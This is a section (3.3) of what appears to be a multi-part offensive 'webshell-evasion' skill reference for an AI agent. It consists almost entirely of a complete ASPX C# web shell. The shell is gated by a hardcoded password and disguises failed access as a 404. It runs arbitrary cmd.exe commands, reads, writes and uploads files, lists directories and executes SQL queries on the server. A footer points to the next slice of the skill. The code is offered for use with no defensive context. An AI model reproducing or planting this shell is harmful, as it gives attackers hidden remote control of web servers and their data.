### 3.3 ASPX WebShell (C#)

```csharp
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string pass = "admin2026";
    string p = Request.Params["pass"];
    if (p != pass) { Response.StatusCode = 404; Response.End(); return; }

    string action = Request.Params["a"];
    string data = Request.Params["d"];

    switch (action) {
        case "cmd":
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + data;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();
            string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
            break;

        case "read":
            Response.Write("<pre>" + Server.HtmlEncode(File.ReadAllText(data)) + "</pre>");
            break;

        case "write":
            string[] parts = data.Split(new char[] { '|' }, 2);
            File.WriteAllText(parts[0], parts[1]);
            Response.Write("Written: " + parts[0]);
            break;

        case "upload":
            HttpPostedFile file = Request.Files[0];
            file.SaveAs(data);
            Response.Write("Uploaded: " + data);
            break;

        case "ls":
            string path = string.IsNullOrEmpty(data) ? Server.MapPath(".") : data;
            foreach (string f in Directory.GetFileSystemEntries(path)) {
                Response.Write((Directory.Exists(f) ? "[D] " : "[F] ") + f + "<br>");
            }
            break;

        case "sql":
            using (SqlConnection conn = new SqlConnection(data)) {
                conn.Open();
                SqlCommand cmd = new SqlCommand(Request.Params["q"], conn);
                SqlDataReader reader = cmd.ExecuteReader();
                while (reader.Read()) {
                    for (int i = 0; i < reader.FieldCount; i++)
                        Response.Write(reader[i] + "\t");
                    Response.Write("<br>");
                }
            }
            break;

        default:
            Response.Write("<h1>ASPX WebShell</h1>");
            Response.Write("<p>Server: " + Server.MachineName + "</p>");
            Response.Write("<p>User: " + Environment.UserName + "</p>");
            Response.Write("<p>OS: " + Environment.OSVersion + "</p>");
            Response.Write("<p>.NET: " + Environment.Version + "</p>");
            Response.Write("<p>Current Dir: " + Directory.GetCurrentDirectory() + "</p>");
            Response.Write("<p>App Domain: " + AppDomain.CurrentDomain.FriendlyName + "</p>");
            break;
    }
}
</script>
```



---
📖 本切片 2/4 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-03-multi-language-webshell-03.md")`